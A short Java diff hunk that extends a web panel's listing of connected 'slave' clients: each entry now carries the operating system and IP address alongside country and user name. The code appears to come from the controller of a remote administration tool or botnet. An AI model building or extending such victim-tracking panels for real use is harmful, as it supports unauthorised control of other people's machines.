@@ -44,7 +44,7 @@ public class WebPanelConnection implements Runnable {
             	StringBuilder sb = new StringBuilder();
             	
             	for (AbstractSlave slave : Main.connections) {
-            		sb.append(slave.getCountry() + ":" + slave.formatUserString());
+            		sb.append(slave.getCountry() + ":" + slave.formatUserString() + ":" + slave.getOperatingSystem() + ":" + slave.getIP());
             		sb.append(";");
             	}
             	
